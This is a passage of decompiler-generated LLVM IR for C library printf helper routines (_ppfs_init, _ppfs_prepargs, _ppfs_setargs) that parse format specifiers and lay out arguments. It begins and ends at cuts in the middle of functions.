  uselistorder label %dec_label_pc_13f48, { 1, 0 }
  uselistorder label %dec_label_pc_13f00, { 1, 0 }
  uselistorder label %dec_label_pc_13e14, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_13ce8, { 1, 0 }
  uselistorder label %dec_label_pc_13ce4, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13c30, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_13bd4, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_13ba0, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_13b84.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_141b0 = load i32, i32* @r4, align 4
  %v6_141b0 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_141bc = load i32, i32* @r1, align 4
  store i32 %v0_141bc, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_141c8 = bitcast i32* %arg1 to i8*
  %v3_141c8 = call i32 @__GI_memset(i8* %v2_141c8, i32 0)
  store i32 %v3_141c8, i32* %r0.global-to-local, align 4
  %v0_141cc = load i32, i32* @r4, align 4
  %v1_141cc = add i32 %v0_141cc, 24
  %v2_141cc = inttoptr i32 %v1_141cc to i32*
  %v3_141cc = load i32, i32* %v2_141cc, align 4
  store i32 %v3_141cc, i32* %r3.global-to-local, align 4
  %v0_141d0 = load i32, i32* @r5, align 4
  %v2_141d0 = inttoptr i32 %v0_141cc to i32*
  store i32 %v0_141d0, i32* %v2_141d0, align 4
  %v0_141d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_141d4 = add i32 %v0_141d4, -1
  %v1_141d8 = load i32, i32* @r4, align 4
  %v2_141d8 = add i32 %v1_141d8, 24
  %v3_141d8 = inttoptr i32 %v2_141d8 to i32*
  store i32 %v1_141d4, i32* %v3_141d8, align 4
  %v0_141dc = load i32, i32* @r4, align 4
  %v1_141dc = add i32 %v0_141dc, 40
  store i32 %v1_141dc, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_141ec21 = inttoptr i32 %v1_141dc to i32*
  store i32 8, i32* %v2_141ec21, align 4
  %v3_141ec22 = load i32, i32* %r2.global-to-local, align 4
  %v4_141ec23 = add i32 %v3_141ec22, 4
  store i32 %v4_141ec23, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_141e8.dec_label_pc_141e8_crit_edge

dec_label_pc_141e8.dec_label_pc_141e8_crit_edge:  ; preds = %entry, %dec_label_pc_141e8.dec_label_pc_141e8_crit_edge
  %v4_141ec24 = phi i32 [ %v4_141ec23, %entry ], [ %v4_141ec, %dec_label_pc_141e8.dec_label_pc_141e8_crit_edge ]
  %v0_141e8.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_141ec.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_141e8 = add i32 %v0_141e8.pre, -1
  store i32 %v1_141e8, i32* %r3.global-to-local, align 4
  %v7_141e8 = icmp eq i32 %v0_141e8.pre, 1
  %v2_141ec = inttoptr i32 %v4_141ec24 to i32*
  store i32 %v0_141ec.pre, i32* %v2_141ec, align 4
  %v3_141ec = load i32, i32* %r2.global-to-local, align 4
  %v4_141ec = add i32 %v3_141ec, 4
  store i32 %v4_141ec, i32* %r2.global-to-local, align 4
  br i1 %v7_141e8, label %dec_label_pc_141f4, label %dec_label_pc_141e8.dec_label_pc_141e8_crit_edge

dec_label_pc_141f4:                               ; preds = %dec_label_pc_141e8.dec_label_pc_141e8_crit_edge
  %v0_141f4 = load i32, i32* @r5, align 4
  store i32 %v0_141f4, i32* %r2.global-to-local, align 4
  %v1_142342 = inttoptr i32 %v0_141f4 to i8*
  %v2_142343 = load i8, i8* %v1_142342, align 1
  %v3_142344 = zext i8 %v2_142343 to i32
  store i32 %v3_142344, i32* %r0.global-to-local, align 4
  %v2_142385 = icmp eq i8 %v2_142343, 0
  br i1 %v2_142385, label %dec_label_pc_14240, label %dec_label_pc_141fc

dec_label_pc_141fc:                               ; preds = %dec_label_pc_141f4, %dec_label_pc_14234.backedge
  %v0_14204 = phi i32 [ %storemerge, %dec_label_pc_14234.backedge ], [ %v0_141f4, %dec_label_pc_141f4 ]
  %v0_141fc = phi i32 [ %v3_14234, %dec_label_pc_14234.backedge ], [ %v3_142344, %dec_label_pc_141f4 ]
  %v7_141fc = icmp eq i32 %v0_141fc, 37
  br i1 %v7_141fc, label %dec_label_pc_14204, label %dec_label_pc_14230

dec_label_pc_14204:                               ; preds = %dec_label_pc_141fc
  %v1_14204 = add i32 %v0_14204, 1
  %v2_14204 = inttoptr i32 %v1_14204 to i8*
  %v3_14204 = load i8, i8* %v2_14204, align 1
  %v4_14204 = zext i8 %v3_14204 to i32
  store i32 %v4_14204, i32* %r3.global-to-local, align 4
  store i32 %v1_14204, i32* %r2.global-to-local, align 4
  %v7_14208 = icmp eq i8 %v3_14204, 37
  br i1 %v7_14208, label %dec_label_pc_14230, label %dec_label_pc_14210

dec_label_pc_14210:                               ; preds = %dec_label_pc_14204
  %v1_14210 = load i32, i32* @r4, align 4
  %v2_14210 = inttoptr i32 %v1_14210 to i32*
  store i32 %v1_14204, i32* %v2_14210, align 4
  %v0_14214 = load i32, i32* @r4, align 4
  store i32 %v0_14214, i32* %r0.global-to-local, align 4
  %v1_14218 = inttoptr i32 %v0_14214 to i8*
  %v2_14218 = call i32 @_ppfs_parsespec(i8* %v1_14218)
  store i32 %v2_14218, i32* %r0.global-to-local, align 4
  %v1_1421c = icmp slt i32 %v2_14218, 0
  br i1 %v1_1421c, label %dec_label_pc_14244.loopexit, label %dec_label_pc_14228

dec_label_pc_14228:                               ; preds = %dec_label_pc_14210
  %v0_14228 = load i32, i32* @r4, align 4
  %v1_14228 = inttoptr i32 %v0_14228 to i32*
  %v2_14228 = load i32, i32* %v1_14228, align 4
  br label %dec_label_pc_14234.backedge

dec_label_pc_14230:                               ; preds = %dec_label_pc_141fc, %dec_label_pc_14204
  %v0_14230 = phi i32 [ %v0_14204, %dec_label_pc_141fc ], [ %v1_14204, %dec_label_pc_14204 ]
  %v1_14230 = add i32 %v0_14230, 1
  br label %dec_label_pc_14234.backedge

dec_label_pc_14234.backedge:                      ; preds = %dec_label_pc_14230, %dec_label_pc_14228
  %storemerge = phi i32 [ %v1_14230, %dec_label_pc_14230 ], [ %v2_14228, %dec_label_pc_14228 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_14234 = inttoptr i32 %storemerge to i8*
  %v2_14234 = load i8, i8* %v1_14234, align 1
  %v3_14234 = zext i8 %v2_14234 to i32
  store i32 %v3_14234, i32* %r0.global-to-local, align 4
  %v2_14238 = icmp eq i8 %v2_14234, 0
  br i1 %v2_14238, label %dec_label_pc_14234.dec_label_pc_14240_crit_edge, label %dec_label_pc_141fc

dec_label_pc_14234.dec_label_pc_14240_crit_edge:  ; preds = %dec_label_pc_14234.backedge
  %v0_14240.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14240

dec_label_pc_14240:                               ; preds = %dec_label_pc_14234.dec_label_pc_14240_crit_edge, %dec_label_pc_141f4
  %v0_14240 = phi i32 [ %v0_14240.pre, %dec_label_pc_14234.dec_label_pc_14240_crit_edge ], [ %v0_141f4, %dec_label_pc_141f4 ]
  %v1_14240 = load i32, i32* @r4, align 4
  %v2_14240 = inttoptr i32 %v1_14240 to i32*
  store i32 %v0_14240, i32* %v2_14240, align 4
  %v1_1424c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14244

dec_label_pc_14244.loopexit:                      ; preds = %dec_label_pc_14210
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14244

dec_label_pc_14244:                               ; preds = %dec_label_pc_14244.loopexit, %dec_label_pc_14240
  %v1_1424c = phi i32 [ -1, %dec_label_pc_14244.loopexit ], [ %v1_1424c.pre, %dec_label_pc_14240 ]
  store i32 %v3_141b0, i32* @r4, align 4
  store i32 %v6_141b0, i32* @r5, align 4
  ret i32 %v1_1424c

; uselistorder directives
  uselistorder i32 %v3_14234, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_141f4, { 1, 0, 2, 3 }
  uselistorder i32 %v4_141ec, { 1, 0 }
  uselistorder i32 %v0_141e8.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 6, 7, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 3, 4, 2, 7, 5, 0 }
  uselistorder label %dec_label_pc_14230, { 1, 0 }
  uselistorder label %dec_label_pc_141fc, { 1, 0 }
  uselistorder label %dec_label_pc_141e8.dec_label_pc_141e8_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_14250 = load i32, i32* @r4, align 4
  store i32 %v3_14250, i32* %stack_var_-12, align 4
  %v0_14254 = load i32, i32* @r0, align 4
  %v1_14254 = add i32 %v0_14254, 24
  %v2_14254 = inttoptr i32 %v1_14254 to i32*
  %v3_14254 = load i32, i32* %v2_14254, align 4
  store i32 %v3_14254, i32* %r5.global-to-local, align 4
  store i32 %v0_14254, i32* @r4, align 4
  %v2_14264 = add i32 %v0_14254, 76
  %v3_14264 = inttoptr i32 %v2_14264 to i32*
  store i32 %arg2, i32* %v3_14264, align 4
  %tmp5 = icmp slt i32 %v3_14254, 1
  br i1 %tmp5, label %dec_label_pc_14288, label %dec_label_pc_1426c

dec_label_pc_1426c:                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_14270 = load i32, i32* @r0, align 4
  %v2_14270 = add i32 %v1_14270, 8
  %v3_14270 = inttoptr i32 %v2_14270 to i32*
  store i32 0, i32* %v3_14270, align 4
  %v0_14274 = load i32, i32* %r5.global-to-local, align 4
  %v1_14274 = load i32, i32* @r0, align 4
  %v2_14274 = add i32 %v1_14274, 28
  %v3_14274 = inttoptr i32 %v2_14274 to i32*
  store i32 %v0_14274, i32* %v3_14274, align 4
  %v0_14278 = load i32, i32* %r3.global-to-local, align 4
  %v1_14278 = load i32, i32* @r0, align 4
  %v2_14278 = add i32 %v1_14278, 24
  %v3_14278 = inttoptr i32 %v2_14278 to i32*
  store i32 %v0_14278, i32* %v3_14278, align 4
  %v0_1427c = load i32, i32* %r3.global-to-local, align 4
  %v1_1427c = load i32, i32* @r0, align 4
  %v2_1427c = add i32 %v1_1427c, 4
  %v3_1427c = inttoptr i32 %v2_1427c to i32*
  store i32 %v0_1427c, i32* %v3_1427c, align 4
  %v0_14280 = call i32 @_ppfs_setargs()
  store i32 %v0_14280, i32* @r0, align 4
  %v0_14284 = load i32, i32* %r5.global-to-local, align 4
  %v1_14284 = load i32, i32* @r4, align 4
  %v2_14284 = add i32 %v1_14284, 24
  %v3_14284 = inttoptr i32 %v2_14284 to i32*
  store i32 %v0_14284, i32* %v3_14284, align 4
  br label %dec_label_pc_14288

dec_label_pc_14288:                               ; preds = %entry, %dec_label_pc_1426c
  %v2_1428c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1428c, i32* @r4, align 4
  %v1_14290 = load i32, i32* @r0, align 4
  ret i32 %v1_14290

; uselistorder directives
  uselistorder i32 %v0_14254, { 1, 0, 2 }
  uselistorder i32 ()* @_ppfs_setargs, { 1, 0 }
  uselistorder label %dec_label_pc_14288, { 1, 0 }
}

define i32 @_ppfs_setargs() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_14294 = load i32, i32* @r0, align 4
  %v1_14294 = add i32 %v0_14294, 24
  %v2_14294 = inttoptr i32 %v1_14294 to i32*
  %v3_14294 = load i32, i32* %v2_14294, align 4
  store i32 %v3_14294, i32* %r1.global-to-local, align 4
  %v2_14298 = icmp eq i32 %v3_14294, 0
  %v3_1429c = load i32, i32* @r4, align 4
  store i32 %v3_1429c, i32* %stack_var_-8, align 4
  %v1_142a0 = add i32 %v0_14294, 8
  %v2_142a0 = inttoptr i32 %v1_142a0 to i32*
  %v3_142a0 = load i32, i32* %v2_142a0, align 4
  store i32 %v3_142a0, i32* %r3.global-to-local, align 4
  %v6_142a8 = icmp eq i32 %v3_142a0, -2147483648
  br i1 %v2_14298, label %dec_label_pc_142a8, label %dec_label_pc_143e0

dec_label_pc_142a8:                               ; preds = %entry
  br i1 %v6_142a8, label %dec_label_pc_142b0, label %dec_label_pc_142c8

dec_label_pc_142b0:                               ; preds = %dec_label_pc_142a8
  %v1_142b0 = add i32 %v0_14294, 76
  %v2_142b0 = inttoptr i32 %v1_142b0 to i32*
  %v3_142b0 = load i32, i32* %v2_142b0, align 4
  store i32 %v3_142b0, i32* %r3.global-to-local, align 4
  %v1_142b4 = inttoptr i32 %v3_142b0 to i32*
  %v2_142b4 = load i32, i32* %v1_142b4, align 4
  store i32 %v2_142b4, i32* %r2.global-to-local, align 4
  %v1_142b8 = add i32 %v3_142b0, 4
  store i32 %v1_142b8, i32* %r3.global-to-local, align 4
  store i32 %v1_142b8, i32* %v2_142b0, align 4
  %v0_142c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_142c0 = load i32, i32* @r0, align 4
  %v2_142c0 = add i32 %v1_142c0, 8
  %v3_142c0 = inttoptr i32 %v2_142c0 to i32*
  store i32 %v0_142c0, i32* %v3_142c0, align 4
  %v0_142c4 = load i32, i32* %r2.global-to-local, align 4
  %v1_142c4 = load i32, i32* @r0, align 4
  %v2_142c4 = add i32 %v1_142c4, 80
  %v3_142c4 = inttoptr i32 %v2_142c4 to i32*
  store i32 %v0_142c4, i32* %v3_142c4, align 4
  %v0_142c8.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_142c8

dec_label_pc_142c8:                               ; preds = %dec_label_pc_142a8, %dec_label_pc_142b0
  %v1_142e4 = phi i32 [ %v0_14294, %dec_label_pc_142a8 ], [ %v0_142c8.pre, %dec_label_pc_142b0 ]
  %v1_142c8 = add i32 %v1_142e4, 4
  %v2_142c8 = inttoptr i32 %v1_142c8 to i32*
  %v3_142c8 = load i32, i32* %v2_142c8, align 4
  store i32 %v3_142c8, i32* %r3.global-to-local, align 4
  %v6_142cc = icmp eq i32 %v3_142c8, -2147483648
  %v1_142d0 = add i32 %v1_142e4, 80
  store i32 %v1_142d0, i32* %ip.global-to-local, align 4
  br i1 %v6_142cc, label %dec_label_pc_142d8, label %dec_label_pc_142f0

dec_label_pc_142d8:                               ; preds = %dec_label_pc_142c8
  %v1_142d8 = add i32 %v1_142e4, 76
  %v2_142d8 = inttoptr i32 %v1_142d8 to i32*
  %v3_142d8 = load i32, i32* %v2_142d8, align 4
  store i32 %v3_142d8, i32* %r3.global-to-local, align 4
  %v1_142dc = inttoptr i32 %v3_142d8 to i32*
  %v2_142dc = load i32, i32* %v1_142dc, align 4
  store i32 %v2_142dc, i32* %r2.global-to-local, align 4
  %v1_142e0 = add i32 %v3_142d8, 4
  store i32 %v1_142e0, i32* %r3.global-to-local, align 4
  store i32 %v1_142e0, i32* %v2_142d8, align 4
  %v0_142e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_142e8 = load i32, i32* @r0, align 4
  %v2_142e8 = add i32 %v1_142e8, 4
  %v3_142e8 = inttoptr i32 %v2_142e8 to i32*
  store i32 %v0_142e8, i32* %v3_142e8, align 4
  %v0_142ec = load i32, i32* %r2.global-to-local, align 4
  %v1_142ec = load i32, i32* @r0, align 4
  %v2_142ec = add i32 %v1_142ec, 80
  %v3_142ec = inttoptr i32 %v2_142ec to i32*
  store i32 %v0_142ec, i32* %v3_142ec, align 4
  %v0_143d017.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_142f0

dec_label_pc_142f0:                               ; preds = %dec_label_pc_142c8, %dec_label_pc_142d8
  %v0_143d017 = phi i32 [ %v1_142e4, %dec_label_pc_142c8 ], [ %v0_143d017.pre, %dec_label_pc_142d8 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_142f4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_142f4, i32* %lr.global-to-local, align 4
  %v1_143d018 = add i32 %v0_143d017, 28
  %v2_143d019 = inttoptr i32 %v1_143d018 to i32*
  %v3_143d020 = load i32, i32* %v2_143d019, align 4
  store i32 %v3_143d020, i32* %r3.global-to-local, align 4
  %v5_143d822 = icmp slt i32 %v0_142f4, %v3_143d020
  br i1 %v5_143d822, label %dec_label_pc_142fc, label %dec_label_pc_143dc.loopexit

dec_label_pc_142fc:                               ; preds = %dec_label_pc_142f0, %dec_label_pc_143d0.backedge
  %v0_143d024 = phi i32 [ %v0_143d0, %dec_label_pc_143d0.backedge ], [ %v0_143d017, %dec_label_pc_142f0 ]
  %v0_1430823 = phi i32 [ %v0_14308.be, %dec_label_pc_143d0.backedge ], [ %v0_142f4, %dec_label_pc_142f0 ]
  %v4_142fc = mul i32 %v0_1430823, 4
  %v5_142fc = add i32 %v4_142fc, %v0_143d024
  store i32 %v5_142fc, i32* %r3.global-to-local, align 4
  %v1_14300 = add i32 %v5_142fc, 40
  %v2_14300 = inttoptr i32 %v1_14300 to i32*
  %v3_14300 = load i32, i32* %v2_14300, align 4
  store i32 %v3_14300, i32* %r3.global-to-local, align 4
  %v7_14304 = icmp eq i32 %v3_14300, 8
  %v1_14308 = add i32 %v0_1430823, 1
  store i32 %v1_14308, i32* %lr.global-to-local, align 4
  br i1 %v7_14304, label %dec_label_pc_143d0.backedge, label %dec_label_pc_14310

dec_label_pc_14310:                               ; preds = %dec_label_pc_142fc
  %v1_14310 = add i32 %v0_143d024, 76
  %v2_14310 = inttoptr i32 %v1_14310 to i32*
  %v3_14310 = load i32, i32* %v2_14310, align 4
  store i32 %v3_14310, i32* %r1.global-to-local, align 4
  %v8_14314 = icmp sgt i32 %v3_14300, 8
  br i1 %v8_14314, label %dec_label_pc_14338, label %dec_label_pc_14318

dec_label_pc_14318:                               ; preds = %dec_label_pc_14310
  %v7_14318 = icmp eq i32 %v3_14300, 2
  br i1 %v7_14318, label %dec_label_pc_14388, label %dec_label_pc_14320

dec_label_pc_14320:                               ; preds = %dec_label_pc_14318
  %v8_14320 = icmp sgt i32 %v3_14300, 2
  br i1 %v8_14320, label %dec_label_pc_14330, label %dec_label_pc_14324

dec_label_pc_14324:                               ; preds = %dec_label_pc_14320
  %v1_14324 = icmp slt i32 %v3_14300, 0
  br i1 %v1_14324, label %dec_label_pc_143bc, label %dec_label_pc_14388

dec_label_pc_14330:                               ; preds = %dec_label_pc_14320
  %v7_14330 = icmp eq i32 %v3_14300, 7
  br i1 %v7_14330, label %dec_label_pc_1439c, label %dec_label_pc_143bc

dec_label_pc_14338:                               ; preds = %dec_label_pc_14310
  %v7_14338 = icmp eq i32 %v3_14300, 1024
  br i1 %v7_14338, label %dec_label_pc_14388, label %dec_label_pc_14340

dec_label_pc_14340:                               ; preds = %dec_label_pc_14338
  %v8_14340 = icmp sgt i32 %v3_14300, 1024
  br i1 %v8_14340, label %dec_label_pc_14358, label %dec_label_pc_14344

dec_label_pc_14344:                               ; preds = %dec_label_pc_14340
  switch i32 %v3_14300, label %dec_label_pc_143bc [
    i32 256, label %dec_label_pc_14388
    i32 512, label %dec_label_pc_14388
  ]

dec_label_pc_14358:                               ; preds = %dec_label_pc_14340
  %v7_14358 = icmp eq i32 %v3_14300, 2048
  br i1 %v7_14358, label %dec_label_pc_1436c, label %dec_label_pc_14364

dec_label_pc_14364:                               ; preds = %dec_label_pc_14358
  %v1_14360 = load i32, i32* %r4.global-to-local, align 4
  %v9_14360 = icmp eq i32 %v3_14300, %v1_14360
  br i1 %v9_14360, label %dec_label_pc_1439c, label %dec_label_pc_143bc

dec_label_pc_1436c:                               ; preds = %dec_label_pc_14358
  %v1_1436c = add i32 %v3_14310, 7
  %v1_14370 = and i32 %v1_1436c, -8
  store i32 %v1_14370, i32* %r3.global-to-local, align 4
  %v1_14374 = inttoptr i32 %v1_14370 to i32*
  %v2_14374 = load i32, i32* %v1_14374, align 8
  store i32 %v2_14374, i32* %r1.global-to-local, align 4
  %v3_14374 = or i32 %v1_14370, 4
  %v4_14374 = inttoptr i32 %v3_14374 to i32*
  %v5_14374 = load i32, i32* %v4_14374, align 4
  store i32 %v5_14374, i32* %r2.global-to-local, align 4
  %v1_14378 = add i32 %v1_14370, 8
  store i32 %v1_14378, i32* %r3.global-to-local, align 4
  store i32 %v1_14378, i32* %v2_14310, align 4
  %v0_14380 = load i32, i32* %ip.global-to-local, align 4
  %v1_14380 = inttoptr i32 %v0_14380 to i32*
  %v2_14380 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_14380, i32* %v1_14380, align 4
  %v3_14380 = add i32 %v0_14380, 4
  %v4_14380 = inttoptr i32 %v3_14380 to i32*
  %v5_14380 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_14380, i32* %v4_14380, align 4
  br label %dec_label_pc_143cc

dec_label_pc_14388:                               ; preds = %dec_label_pc_14344, %dec_label_pc_14344, %dec_label_pc_14324, %dec_label_pc_14338, %dec_label_pc_14318
  %v1_14388 = inttoptr i32 %v3_14310 to i32*
  %v2_14388 = load i32, i32* %v1_14388, align 4
  store i32 %v2_14388, i32* %r2.global-to-local, align 4
  %v1_1438c = add i32 %v3_14310, 4
  store i32 %v1_1438c, i32* %r3.global-to-local, align 4
  store i32 %v1_1438c, i32* %v2_14310, align 4
  %v0_14394 = load i32, i32* %r2.global-to-local, align 4
  %v1_14394 = load i32, i32* %ip.global-to-local, align 4
  %v2_14394 = inttoptr i32 %v1_14394 to i32*
  store i32 %v0_14394, i32* %v2_14394, align 4
  br label %dec_label_pc_143cc

dec_label_pc_1439c:                               ; preds = %dec_label_pc_14330, %dec_label_pc_14364
  %v3_1439c = load i32, i32* %v2_14310, align 4
  %v1_143a0 = add i32 %v3_1439c, 7
  %v1_143a4 = and i32 %v1_143a0, -8
  store i32 %v1_143a4, i32* %r3.global-to-local, align 4
  %v1_143a8 = inttoptr i32 %v1_143a4 to i32*
  %v2_143a8 = load i32, i32* %v1_143a8, align 8
  store i32 %v2_143a8, i32* %r1.global-to-local, align 4
  %v3_143a8 = or i32 %v1_143a4, 4
  %v4_143a8 = inttoptr i32 %v3_143a8 to i32*
  %v5_143a8 = load i32, i32* %v4_143a8, align 4
  store i32 %v5_143a8, i32* %r2.global-to-local, align 4
  %v1_143ac = add i32 %v1_143a4, 8
  store i32 %v1_143ac, i32* %r3.global-to-local, align 4
  store i32 %v1_143ac, i32* %v2_14310, align 4
  %v0_143b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_143b4 = inttoptr i32 %v0_143b4 to i32*
  %v2_143b4 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_143b4, i32* %v1_143b4, align 4
  %v3_143b4 = add i32 %v0_143b4, 4
  %v4_143b4 = inttoptr i32 %v3_143b4 to i32*
  %v5_143b4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_143b4, i32* %v4_143b4, align 4
  br label %dec_label_pc_143cc

dec_label_pc_143bc:                               ; preds = %dec_label_pc_14344, %dec_label_pc_14330, %dec_label_pc_14324, %dec_label_pc_14364
  %v1_143bc = add i32 %v3_14310, 4
  store i32 %v1_143bc, i32* %r3.global-to-local, align 4
  store i32 %v1_143bc, i32* %v2_14310, align 4
  %v0_143c4 = load i32, i32* %r1.global-to-local, align 4
  %v1_143c4 = inttoptr i32 %v0_143c4 to i32*
  %v2_143c4 = load i32, i32* %v1_143c4, align 4
  store i32 %v2_143c4, i32* %r3.global-to-local, align 4
  %v1_143c8 = load i32, i32* %ip.global-to-local, align 4
  %v2_143c8 = inttoptr i32 %v1_143c8 to i32*
  store i32 %v2_143c4, i32* %v2_143c8, align 4
  br label %dec_label_pc_143cc

dec_label_pc_143cc:                               ; preds = %dec_label_pc_1439c, %dec_label_pc_14388, %dec_label_pc_1436c, %dec_label_pc_143bc
  %v0_143cc = load i32, i32* %ip.global-to-local, align 4
  %v1_143cc = add i32 %v0_143cc, 8
  store i32 %v1_143cc, i32* %ip.global-to-local, align 4
  %v0_143d4.pre.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_143d0.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_143d0.backedge

dec_label_pc_143d0.backedge:                      ; preds = %dec_label_pc_143cc, %dec_label_pc_142fc
  %v0_143d0 = phi i32 [ %v0_143d0.pre, %dec_label_pc_143cc ], [ %v0_143d024, %dec_label_pc_142fc ]
  %v0_14308.be = phi i32 [ %v0_143d4.pre.pre, %dec_label_pc_143cc ], [ %v1_14308, %dec_label_pc_142fc ]
  %v1_143d0 = add i32 %v0_143d0, 28
  %v2_143d0 = inttoptr i32 %v1_143d0 to i32*
  %v3_143d0 = load i32, i32* %v2_143d0, align 4
  store i32 %v3_143d0, i32* %r3.global-to-local, align 4
  %v5_143d8 = icmp slt i32 %v0_14308.be, %v3_143d0
  br i1 %v5_143d8, label %dec_label_pc_142fc, label %dec_label_pc_143d0.dec_label_pc_143dc.loopexit_crit_edge

dec_label_pc_143e0:                               ; preds = %entry
  br i1 %v6_142a8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_143e0
  %v2_143e4 = add i32 %v0_14294, 36
  %v3_143e4 = inttoptr i32 %v2_143e4 to i8*
  %v4_143e4 = load i8, i8* %v3_143e4, align 1
  %v5_143e4 = zext i8 %v4_143e4 to i32
  %v5_143e8 = mul nuw nsw i32 %v5_143e4, 8
  %v6_143e8 = add i32 %v5_143e8, %v0_14294
  store i32 %v6_143e8, i32* %r3.global-to-local, align 4
  %v2_143ec = add i32 %v6_143e8, 72
  %v3_143ec = inttoptr i32 %v2_143ec to i32*
  %v4_143ec = load i32, i32* %v3_143ec, align 4
  store i32 %v4_143ec, i32* %r3.global-to-local, align 4
  store i32 %v4_143ec, i32* %v2_142a0, align 4
  %v0_143f4.pre = load i32, i32* @r0, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_143e0, %bb
  %v2_14408 = phi i32 [ %v0_143f4.pre, %bb ], [ %v0_14294, %dec_label_pc_143e0 ]
  %v1_143f4 = add i32 %v2_14408, 4
  %v2_143f4 = inttoptr i32 %v1_143f4 to i32*
  %v3_143f4 = load i32, i32* %v2_143f4, align 4
  store i32 %v3_143f4, i32* %r3.global-to-local, align 4
  %v6_143f8 = icmp eq i32 %v3_143f4, -2147483648
  br i1 %v6_143f8, label %bb16, label %dec_label_pc_143dc

bb16:                                             ; preds = %.thread1
  %v2_143fc = add i32 %v2_14408, 37
  %v3_143fc = inttoptr i32 %v2_143fc to i8*
  %v4_143fc = load i8, i8* %v3_143fc, align 1
  %v5_143fc = zext i8 %v4_143fc to i32
  %v5_14400 = mul nuw nsw i32 %v5_143fc, 8
  %v6_14400 = add i32 %v5_14400, %v2_14408
  store i32 %v6_14400, i32* %r3.global-to-local, align 4
  %v2_14404 = add i32 %v6_14400, 72
  %v3_14404 = inttoptr i32 %v2_14404 to i32*
  %v4_14404 = load i32, i32* %v3_14404, align 4
  store i32 %v4_14404, i32* %r3.global-to-local, align 4
  store i32 %v4_14404, i32* %v2_143f4, align 4
  %v0_1440c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_143dc

dec_label_pc_143d0.dec_label_pc_143dc.loopexit_crit_edge: ; preds = %dec_label_pc_143d0.backedge
  br label %dec_label_pc_143dc.loopexit

dec_label_pc_143dc.loopexit:                      ; preds = %dec_label_pc_143d0.dec_label_pc_143dc.loopexit_crit_edge, %dec_label_pc_142f0
  %v0_143d0.lcssa = phi i32 [ %v0_143d0, %dec_label_pc_143d0.dec_label_pc_143dc.loopexit_crit_edge ], [ %v0_143d017, %dec_label_pc_142f0 ]
  br label %dec_label_pc_143dc

dec_label_pc_143dc:                               ; preds = %dec_label_pc_143dc.loopexit, %.thread1, %bb16
  %v1_1442c = phi i32 [ %v0_143d0.lcssa, %dec_label_pc_143dc.loopexit ], [ %v2_14408, %.thread1 ], [ %v0_1440c.pre, %bb16 ]
  %v1_1440c = add i32 %v1_1442c, 8
  %v2_1440c = inttoptr i32 %v1_1440c to i32*
  %v3_1440c = load i32, i32* %v2_1440c, align 4
  store i32 %v3_1440c, i32* %r1.global-to-local, align 4
  %v1_14410 = icmp slt i32 %v3_1440c, 0
  br i1 %v1_14410, label %dec_label_pc_14418, label %dec_label_pc_14438

dec_label_pc_14418:                               ; preds = %dec_label_pc_143dc
  %v1_14418 = add i32 %v1_1442c, 16
